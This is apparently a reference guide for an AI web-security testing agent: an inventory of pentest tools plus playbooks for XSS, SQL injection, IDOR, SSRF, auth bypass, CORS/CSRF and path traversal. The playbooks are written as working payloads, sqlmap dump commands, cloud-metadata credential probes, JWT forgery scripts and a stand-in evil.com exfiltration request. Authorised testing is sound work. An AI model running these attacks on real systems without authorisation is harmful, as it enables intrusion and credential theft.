# Web RE Tools

## MCP Analysis Tools

The chrome-devtools MCP loads exclusively for this agent and is the PRIMARY tool
for all browser-based testing.

**chrome-devtools MCP** — structured Chrome DevTools Protocol interaction:
navigate pages, take DOM snapshots, capture screenshots, click elements, fill
forms, execute JavaScript, list network requests, inspect individual requests,
list console messages, run Lighthouse audits, and trace performance.

Available commands:

- `navigate_page` — navigate Chrome to a URL and wait for page load
- `take_snapshot` — capture the current page DOM as an accessibility tree
  snapshot with element references for structured interaction
- `take_screenshot` — capture a PNG screenshot of the current page state
- `click` — click a specific element by reference from a snapshot
- `fill` — fill an input element with text by reference from a snapshot
- `evaluate_script` — execute arbitrary JavaScript in the page context
- `list_network_requests` — list all network requests captured by Chrome
  DevTools during the session
- `get_network_request` — get full details of a specific network request
  including request/response headers and body
- `list_console_messages` — list all console messages from the page
- `lighthouse_audit` — run a Lighthouse performance/security/SEO audit on
  the current page
- `performance_tracing` — capture and analyze performance traces

MCP tools are discovered automatically at runtime. Use chrome-devtools as the
primary analysis and interaction interface for all browser-based tasks. Fall back
to CLI tools (`curl`, `httpie`, `nuclei`, etc.) when MCP tools do not cover the
need or when you need speed for bulk operations.

Shared MCP servers also available to this agent:

- **semgrep MCP** — structured Semgrep scans and rule/schema lookup through
  `semgrep mcp`
- **GitHub MCP** — repository, issue, PR, Actions, Dependabot, and code
  security context through the official `github-mcp-server`

## Installed On This Machine

### Browser and proxy

- `chrome-devtools MCP` — primary browser interaction tool via DevTools Protocol
  (see above)
- `mitmproxy` / `mitmdump` / `mitmweb` — interactive HTTPS proxy:
  intercept, inspect, modify, and replay HTTP(S) traffic; `mitmdump` for
  headless capture, `mitmweb` for browser UI, `mitmproxy` for terminal UI
- `burpsuite` — professional web application security testing platform:
  proxy, scanner, repeater, intruder, decoder, and comparer

### Reconnaissance

- `subfinder` — subdomain discovery tool: find subdomains from passive DNS
  sources, certificate transparency logs, and search engines
- `amass` — DNS enumeration and network mapping: discover subdomains, DNS
  records, and infrastructure through active and passive techniques
- `httpx` — fast HTTP prober: enumerate live hosts, extract titles, status
  codes, technologies, response headers, and TLS information from URLs
- `whatweb` — web technology fingerprinter: identify CMS, frameworks, server
  software, JavaScript libraries, and other technologies from HTTP responses
- `katana` — web crawler/spider: discover URLs, endpoints, JavaScript files,
  and API paths from web applications with JavaScript rendering support
- `hakrawler` — fast endpoint crawler for URLs, links, scripts, and forms
- `gau` — fetch known URLs from AlienVault, Wayback, Common Crawl, and URLScan
- `waybackurls` — fetch historical URLs known to the Wayback Machine
- `rustscan` — fast port scanner: rapid discovery of open ports on target
  infrastructure (10x faster than nmap for initial sweep); pipe results to
  nmap for service fingerprinting

### Vulnerability scanning

- `nuclei` — template-based vulnerability scanner: fast detection of known
  CVEs, misconfigurations, exposed panels, default credentials, and common
  vulnerabilities using community templates
- `nikto` — web server scanner: detect dangerous files, outdated software,
  server misconfigurations, and known vulnerabilities
- `sqlmap` — SQL injection detection and exploitation: automatic detection
  and exploitation of SQL injection flaws with support for multiple database
  backends, techniques, and extraction modes
- `dalfox` — XSS scanner: detect and verify cross-site scripting
  vulnerabilities with advanced payload generation, bypass techniques, and
  blind XSS testing
- `zap` — OWASP ZAP web proxy/scanner: automated and manual security testing
  for web applications, active/passive scanning, spidering, and fuzzing
- `semgrep` — static analysis with pattern-matching and taint-tracking rules:
  scan discovered JavaScript files and server-side code for SQL injection, XSS,
  command injection, hardcoded secrets, SSRF, and DOM-based vulnerability
  patterns. Install with `pip install --user semgrep`. See SEMGREP-GUIDE.md
  for setup, commands, and custom web rules.
- `codeql` — deep semantic code analysis with full taint tracking and dataflow
  path validation. Use when Semgrep cannot resolve ambiguous dataflow or you
  need to prove a specific source-to-sink path. Supports JavaScript, Python,
  Java, Go. See CODEQL-GUIDE.md for setup, database creation, and custom
  web queries.
- `commix` — command injection scanner: automated detection and exploitation
  of OS command injection vulnerabilities in web applications
- `jaeles` — automated web testing/signature scanner for target-specific checks

### Fuzzing

- `ffuf` — fast web fuzzer: brute-force directories, files, parameters,
  virtual hosts, and API endpoints; supports recursive and recursive-domain
  fuzzing
- `kiterunner` — API route and content discovery with contextual wordlists,
  useful for REST and JSON API surface expansion
- `arjun` — HTTP parameter discovery: find hidden query parameters, POST
  body fields, and headers that the server accepts; useful for mapping API
  attack surface
- `gobuster` — directory/file/DNS/VHost brute-forcing: discover hidden
  paths, files, subdomains, and virtual hosts using wordlist-based enumeration
- `feroxbuster` — recursive content discovery: brute-force directories and
  files with automatic recursion, heuristic filtering of false positives,
  and response size/code filtering

### Network

- `nmap` — port scanning and service fingerprinting: discover open ports,
  running services, OS detection, and scriptable vulnerability checks
- `masscan` — fast port scanner: internet-scale port scanning for rapid
  discovery of open ports across large IP ranges
- `tcpdump` — CLI packet capture: capture and filter network traffic for
  analysis and evidence collection
- `wireshark-cli` (`tshark`) — CLI network protocol analyzer: capture and
  decode packets, filter by protocol/field, export to PCAP

### TLS analysis

- `testssl` — TLS testing tool: comprehensive SSL/TLS cipher, protocol,
  and certificate analysis; checks for Heartbleed, POODLE, CRIME, BEAST,
  and other known TLS vulnerabilities with color-coded severity output

### OOB interaction

- `interactsh` — OOB interaction server (ProjectDiscovery): detect blind
  vulnerabilities (blind XSS, blind SSRF, blind injection) by monitoring
  DNS, HTTP, and HTTPS callback requests from the target to your
  interactsh instance; provides unique subdomains per test for correlation

### Supply chain scanning

- `trivy` — vulnerability and secret scanner: scan container images, file
  systems, git repositories, and Kubernetes clusters for CVEs, misconfigs,
  and embedded secrets
- `osv-scanner` — OSV-backed dependency vulnerability scanning for source trees
  and lockfiles
- `syft` — generate SBOMs from source trees, containers, and filesystems
- `grype` — scan SBOMs, containers, and filesystems for known vulnerabilities

### Historical analysis

- `waybackpy` (Python) — Wayback Machine API client: retrieve archived
  versions of target URLs, discover historical endpoints and URL patterns,
  analyze how the target changed over time
- `gau` / `waybackurls` — fast historical URL collection for endpoint and
  parameter discovery

### HTTP clients

- `curl` — universal HTTP client: send requests with full control over
  headers, methods, cookies, authentication, and TLS settings
- `curl-impersonate` — curl with browser TLS fingerprints: impersonate
  Chrome, Firefox, and Safari TLS stacks to bypass bot detection
- `httpie` (`http` command) — human-friendly HTTP client: syntax-highlighted
  output, session management, and authentication helpers
- `hurl` — HTTP request runner: define HTTP requests in plain text and run
  them for testing and integration verification
- `bruno` — API client: graphical and CLI tool for API exploration, testing,
  and documentation with environment support
- `grpcurl` — gRPC command-line client: interact with gRPC services, list
  methods, and call RPCs with JSON payloads

### Analysis

- `cyberchef` — universal data transformation tool: encode/decode/hash/
  encrypt/compress data, convert between formats, analyze base64/hex/JWT
  tokens captured during testing
- `jwt-cli` — decode, verify, and craft JWTs during auth and session testing
- `step-cli` — inspect X.509 certificates, OAuth/OIDC metadata, JWTs, and
  trust-chain material
- `jq` — JSON processor: parse, filter, transform, and extract data from
  JSON API responses and log files
- `linkfinder` — JavaScript endpoint discovery (install with `pip install linkfinder`):
  parse JavaScript files to discover hidden API endpoints, paths, and parameters
  not visible in the application UI

### Brute force

- `hydra` — online brute-force tool: attack login forms, SSH, FTP, HTTP
  authentication, and many other protocols with custom wordlists and rules

## Tool Selection Guide

Use the smallest tool that gives a reliable answer:

- **Need technology fingerprint?** Use `whatweb`, `httpx`
- **Need subdomains or infrastructure?** Use `subfinder`, `amass`
- **Need URLs and endpoints?** Use `katana`, `hakrawler`, `gau`,
  `waybackurls`, `ffuf`
- **Need to interact with a page?** Use chrome-devtools MCP
- **Need to capture/inspect traffic?** Use `mitmdump` via tmux
- **Need to scan for known vulnerabilities?** Use `nuclei`
- **Need to test for XSS?** Use `dalfox` + chrome-devtools
- **Need to test for SQL injection?** Use `sqlmap`
- **Need to find hidden parameters?** Use `arjun`
- **Need to fuzz endpoints?** Use `ffuf`, `kiterunner`
- **Need to send crafted HTTP requests?** Use `curl`, `httpie`
- **Need to brute-force auth?** Use `hydra`
- **Need repeated proof?** Write a Bash/Python/Node/Bun script
- **Need to scan source for vulnerability patterns?** Use `semgrep --config auto`
- **Need deep taint tracking on a specific path?** Use `codeql database analyze`
- **Need to fuzz directories recursively?** Use `feroxbuster`, `gobuster`
- **Need fast port discovery?** Use `rustscan`, then `nmap` for detail
- **Need to test TLS/SSL?** Use `testssl`
- **Need blind vuln detection?** Use `interactsh`
- **Need command injection testing?** Use `commix`
- **Need to find JS endpoints?** Use `linkfinder`
- **Need historical URL analysis?** Use `gau`, `waybackurls`, `waybackpy`
- **Need supply chain CVE scanning?** Use `trivy`, `osv-scanner`, `syft`,
  `grype`

## Fast Vulnerability Playbooks

### XSS testing with dalfox and chrome-devtools

Goal: find and prove cross-site scripting vulnerabilities.

Step 1: identify reflected parameters with dalfox:

```bash
dalfox url "https://example.com/search?q=test" --blind https://your-callback.url
```

Step 2: verify and exploit with chrome-devtools:

```
navigate_page to https://example.com/search?q=<script>alert(1)</script>
take_snapshot — check if payload is reflected unescaped in DOM
evaluate_script — check if XSS fires: document.querySelector('[data-xss]')
list_console_messages — look for XSS indicator messages
```

Step 3: test stored XSS via forms:

```
navigate_page to https://example.com/comment
take_snapshot
fill @eN with XSS payload
click submit button
navigate_page to page that renders the stored content
take_snapshot — check if payload rendered
```

Step 4: test DOM-based XSS:

```
navigate_page to https://example.com/page#<img src=x onerror=alert(1)>
evaluate_script — check document.location.hash, document.write usage
list_console_messages — look for error/output from XSS
```

### SQL injection with sqlmap

Goal: detect and exploit SQL injection flaws.

```bash
# Basic detection
sqlmap -u "https://example.com/api/users?id=1" --batch --level 3

# POST parameter testing
sqlmap -u "https://example.com/api/login" --data="user=admin&pass=test" --batch

# With authentication
sqlmap -u "https://example.com/api/users?id=1" --cookie="session=abc123" --batch

# Specific technique
sqlmap -u "https://example.com/api/users?id=1" --technique=U --batch

# Dump data from confirmed injection
sqlmap -u "https://example.com/api/users?id=1" --dump --batch
```

After sqlmap confirms injection, write a PoC script:

```python
import requests
url = "https://example.com/api/users"
params = {"id": "1 UNION SELECT username,password FROM users--"}
r = requests.get(url, params=params, cookies={"session": "abc123"})
print(r.text)
```

### IDOR testing (manual/API testing)

Goal: prove unauthorized access to other users' data.

```bash
# Identify object IDs in API responses
curl -s -H "Authorization: Bearer $TOKEN" "https://example.com/api/users/me" | jq .
curl -s -H "Authorization: Bearer $TOKEN" "https://example.com/api/orders" | jq '.[0].id'

# Test IDOR by modifying object IDs
for i in $(seq 1 20); do
  curl -s -H "Authorization: Bearer $TOKEN" "https://example.com/api/users/$i" | jq '{id, email, name}' 2>/dev/null
done

# Test without auth token
curl -s "https://example.com/api/users/1" | jq .
```

With chrome-devtools:

```
navigate_page to https://example.com/profile/1
list_network_requests — capture API calls
get_network_request — inspect the /api/users/1 request
navigate_page to https://example.com/profile/2
list_network_requests — check if different user data returned
```

### SSRF testing

Goal: make the server fetch internal or restricted resources.

```bash
# Test URL parameters for SSRF
curl -s "https://example.com/fetch?url=http://127.0.0.1:80/admin"
curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://example.com/fetch?url=http://localhost:22/"

# Test with different protocols
curl -s "https://example.com/fetch?url=file:///etc/passwd"
curl -s "https://example.com/fetch?url=gopher://internal:25/"

# DNS rebinding
curl -s "https://example.com/fetch?url=http://a]b.your-domain.com/"
```

With chrome-devtools:

```
navigate_page to https://example.com/fetch
take_snapshot
fill URL input with http://169.254.169.254/latest/meta-data/
click submit
take_snapshot — check response
list_network_requests — inspect the server-side request
```

### Auth bypass testing

Goal: bypass authentication or authorization mechanisms.

```bash
# JWT none algorithm
python3 -c "
import jwt
token = jwt.encode({'role':'admin','user':'1'}, '', algorithm='none')
print(token)
"
curl -s -H "Authorization: Bearer $TOKEN" "https://example.com/api/admin"

# JWT algorithm confusion (RS256 -> HS256)
# Extract public key, sign with HS256 using the public key as secret

# Session manipulation
curl -s -H "Authorization: Bearer $TOKEN" "https://example.com/api/admin/users"
# Modify JWT claims and resend

# Force browsing
curl -s "https://example.com/admin/dashboard"
curl -s "https://example.com/api/v2/admin/users"
```

### CORS/CSRF testing

Goal: find CORS misconfigurations and CSRF vulnerabilities.

```bash
# Test CORS with different origins
curl -s -H "Origin: https://evil.com" -I "https://example.com/api/data"
curl -s -H "Origin: https://evil.example.com" -I "https://example.com/api/data"
curl -s -H "Origin: https://sub.example.com" -I "https://example.com/api/data"

# Check for wildcard or null origin
curl -s -H "Origin: null" -I "https://example.com/api/data"

# CSRF: check if state-changing requests lack CSRF tokens
curl -s -X POST "https://example.com/api/change-email" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=abc123" \
  -d '{"email":"attacker@evil.com"}'
```

### Directory traversal and file inclusion

Goal: access files outside the intended directory.

```bash
# Basic traversal
curl -s "https://example.com/download?file=../../../etc/passwd"
curl -s "https://example.com/download?file=....//....//etc/passwd"

# URL encoding bypass
curl -s "https://example.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double encoding
curl -s "https://example.com/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

### JWT analysis

Goal: find weaknesses in JWT implementation.

```bash
# Decode JWT
echo "eyJ..." | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Decode with Python
python3 -c "import jwt,sys; t=sys.argv[1]; print(jwt.decode(t,options={'verify_signature':False}))" "eyJ..."
```

Common JWT weaknesses:

- algorithm confusion (`"alg":"none"`, RS256 vs HS256)
- weak or empty signature
- missing `exp`/`nbf` claims (tokens never expire)
- sensitive data in payload
- predictable token values
- missing issuer/audience binding
- token replay across sessions or users

### API schema fuzzing with schemathesis

Goal: automatically fuzz API endpoints based on their OpenAPI schema.

Step 1: Discover the OpenAPI schema URL

```bash
# Common schema locations
curl -s https://target.com/openapi.json | jq '.info'
curl -s https://target.com/swagger.json | jq '.info'
curl -s https://target.com/api/docs | jq '.'
```

Step 2: Run schemathesis against the schema

```bash
# From a schema URL (uvx runs without install)
uvx schemathesis run https://target.com/openapi.json

# With authentication
uvx schemathesis run --header "Authorization: Bearer $TOKEN" https://target.com/openapi.json

# Target specific endpoints
uvx schemathesis run --endpoint "/api/users" --method POST https://target.com/openapi.json

# From a saved schema file
uvx schemathesis run schema.json
```

Step 3: Analyze results and verify findings

Check server error responses (5xx) for unhandled inputs, 4xx for
unexpected validation bypass, and anomalous response times for timing
attacks.

## Tmux Session Layout

`web-re.sh` creates a tmux session called `web-re` with these windows:

| Window | Name    | Purpose                           |
| ------ | ------- | --------------------------------- |
| 0      | `shell` | General shell, CLI tools          |
| 1      | `mitm`  | `mitmdump` live traffic capture   |
| 2      | `proxy` | proxy configuration and status    |
| 3      | `logs`  | `tail -f` tool output and logs    |
| 4      | `recon` | long-running recon/scanning tasks |

### Reading tmux panes from the agent

You cannot attach interactively from the agent. Capture pane output instead:

```bash
tmux capture-pane -t web-re:mitm -p -S -80
tmux capture-pane -t web-re:logs -p -S -80
tmux capture-pane -t web-re:recon -p -S -80
tmux capture-pane -t web-re:shell -p -S -80
tmux capture-pane -t web-re:proxy -p -S -80
```

### Sending commands to tmux panes

```bash
tmux send-keys -t web-re:mitm C-c
tmux send-keys -t web-re:mitm "clear" Enter
tmux send-keys -t web-re:mitm "mitmdump --set confdir=$HOME/Downloads/web-re-tools/custom-ca --listen-host 0.0.0.0 --listen-port 8084 --set flow_detail=2" Enter

tmux send-keys -t web-re:recon "nuclei -u https://example.com -t ~/nuclei-templates/ -o /tmp/nuclei-results.txt" Enter
tmux capture-pane -t web-re:recon -p -S -60
```

## chrome-devtools Practical Usage

### Core workflow

The chrome-devtools MCP is the primary tool for browser-based testing. Use it
for everything from navigation to exploitation.

```
# Navigate to target
navigate_page to https://example.com

# Snapshot the current page state
take_snapshot — returns accessibility tree with element refs (@eN)

# Take a screenshot for evidence
take_screenshot — saves PNG of current page state

# Click an element
click @e5

# Fill a form field
fill @e7 "test@example.com"

# Execute JavaScript
evaluate_script "document.cookie"
evaluate_script "document.querySelector('form').action"
evaluate_script "fetch('/api/admin/users').then(r=>r.text()).then(t=>console.log(t))"

# List network requests
list_network_requests — shows all requests since page load

# Get details of a specific request
get_network_request for request ID — shows full headers and body

# Monitor console
list_console_messages — shows JS errors, logs, XSS outputs

# Performance and security audit
lighthouse_audit — run Lighthouse checks
```

### Systematic page exploration

For each page you discover:

1. `navigate_page` to the URL
2. `take_snapshot` — read the full page structure
3. `take_screenshot` — capture evidence
4. `list_network_requests` — see what API calls the page makes
5. `list_console_messages` — check for errors and information leaks
6. Click every link and button, fill every form
7. After each interaction, re-snapshot and re-check network requests
8. Move to the next page

### Network request analysis

```
# Navigate and interact, then list all requests
navigate_page to https://example.com/dashboard
list_network_requests
# Find API calls of interest
get_network_request for each interesting request
# Look for: auth tokens, session cookies, API keys, user data
```

### JavaScript analysis

```
# Check for exposed globals
evaluate_script "Object.keys(window).filter(k => !['location','navigator','document'].includes(k))"

# Check cookies
evaluate_script "document.cookie"

# Check localStorage
evaluate_script "JSON.stringify(localStorage)"

# Check for source maps
evaluate_script "Array.from(document.querySelectorAll('script[src]')).map(s => s.src)"

# Check CSP
evaluate_script "document.querySelector('meta[http-equiv=Content-Security-Policy]')"
```

### Form and auth testing

```
navigate_page to https://example.com/login
take_snapshot
fill @e3 "admin'--"
fill @e5 "password"
click @e7  # submit button
take_snapshot — check for auth bypass or error messages
list_network_requests — inspect the login request
list_console_messages — check for information leaks
```

## mitmproxy Practical Usage

### Architecture

- `mitmdump` runs in tmux window `web-re:mitm`
- config dir: `~/Downloads/web-re-tools/custom-ca/`
- default listen: `0.0.0.0:8084`
- CA cert is available for system trust store

### Start and stop

```bash
bash scripts/ai/web-re/web-re.sh mitm-start
bash scripts/ai/web-re/web-re.sh mitm-stop
```

### Manual start with options

```bash
tmux send-keys -t web-re:mitm C-c
sleep 1
tmux send-keys -t web-re:mitm "mitmdump --set confdir=$HOME/Downloads/web-re-tools/custom-ca --listen-host 0.0.0.0 --listen-port 8084 --set flow_detail=3" Enter
```

### Read captured traffic

```bash
tmux capture-pane -t web-re:mitm -p -S -300
tmux capture-pane -t web-re:mitm -p -S -300 | grep -oP '(?:GET|POST|PUT|DELETE|PATCH|HEAD) https?://[^ ]+' | sort -u
tmux capture-pane -t web-re:mitm -p -S -300 | grep 'POST https'
tmux capture-pane -t web-re:mitm -p -S -300 | grep '<< HTTP'
tmux capture-pane -t web-re:mitm -p -S -300 | grep -iE 'authorization|bearer|x-api-key|token|cookie'
```

### Configure browser proxy

To route Chrome through mitmproxy, set the proxy via chrome-devtools:

```
evaluate_script "window.location.href"  # note current URL
# Configure Chrome to use proxy on 127.0.0.1:8084
# This is typically done at Chrome startup via command-line flags
# Use: bash scripts/ai/web-re/web-re.sh start-chrome --proxy
```

### Interpret common output

- visible decrypted requests -> interception is working
- `Client TLS handshake failed` -> trust failure or certificate issue
- `client disconnected` -> app retrying, rejecting, or WAF blocking
- no output at all -> proxy not configured, traffic not routed through proxy,
  or no requests made yet
- `403` responses with anti-bot messages -> WAF or bot detection active

## Custom Scripts and Packages

You are expected to write and run custom scripts to validate findings. This is
core web security work.

### Available runtimes

| Runtime  | Version | Good for                                                  |
| -------- | ------- | --------------------------------------------------------- |
| Bash     | 5.3     | quick one-liners, curl pipelines, tool orchestration      |
| Python 3 | 3.13    | exploit scripts, crypto helpers, data parsing, automation |
| Node.js  | 24.13   | HTTP clients, JSON tooling, quick API testing             |
| Bun      | 1.3.10  | fast TS/JS execution and lightweight tooling              |

Install packages freely:

```bash
pip install --user requests pwntools beautifulsoup4
npm install -g got cheerio
bun add zod axios
```

### Good PoC targets

- replay captured requests with modified parameters or IDs
- validate auth bypass assumptions
- automate IDOR testing across a range of IDs
- craft XSS payloads and verify execution
- test SSRF with various internal targets
- brute-force endpoints or parameters
- convert captured traffic into a reusable report

Final rule: if a claim matters, automate the proof.

## External Research

When you hit a wall — a WAF you cannot bypass, a framework you are unfamiliar
with, or a vulnerability class you need to research — search aggressively:

- **GitHub**: search for exploit PoCs, bypass techniques, and security tools
  for the target technology
- **CVE databases**: search for known CVEs in identified frameworks, libraries,
  and server software
- **Security blogs and writeups**: search for bypass techniques, exploitation
  methods, and comparable vulnerabilities
- **Official docs**: check framework documentation for security features and
  default configurations

Always validate external techniques against the actual target before trusting
them. Adapt, don't copy blindly.

## Scripting And POC Development

You are expected to write and run custom scripts to validate findings. This is
core security work.

### Python PoC examples

```python
#!/usr/bin/env python3
import requests

# IDOR PoC
base_url = "https://example.com/api"
token = "eyJ..."

for user_id in range(1, 50):
    r = requests.get(
        f"{base_url}/users/{user_id}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200 and "email" in r.text:
        data = r.json()
        print(f"[IDOR] User {user_id}: {data.get('email')} ({data.get('name')})")
```

```python
#!/usr/bin/env python3
import requests

# JWT none algorithm PoC
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"role":"admin","user":"1","iat":1516239022}).encode()).rstrip(b'=').decode()
token = f"{header}.{payload}."

r = requests.get(
    "https://example.com/api/admin/dashboard",
    headers={"Authorization": f"Bearer {token}"}
)
print(f"Status: {r.status_code}")
print(f"Body: {r.text[:500]}")
```

### Bash PoC examples

```bash
#!/usr/bin/env bash
set -euo pipefail

# SSRF PoC — cloud metadata
for url in \
  "http://169.254.169.254/latest/meta-data/" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  "http://metadata.google.internal/computeMetadata/v1/" \
  "http://100.100.100.200/latest/meta-data/"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")
  echo "[*] Testing SSRF with: $url"
  curl -s "https://example.com/fetch?url=${encoded}" | head -20
  echo "---"
done
```

### Node.js PoC examples

```javascript
// XSS callback server
const http = require("http");
const server = http.createServer((req, res) => {
  console.log(`[XSS CALLBACK] ${req.method} ${req.url}`);
  console.log("Headers:", JSON.stringify(req.headers, null, 2));
  res.writeHead(200);
  res.end("ok");
});
server.listen(8080, () => console.log("Listening on :8080"));
```
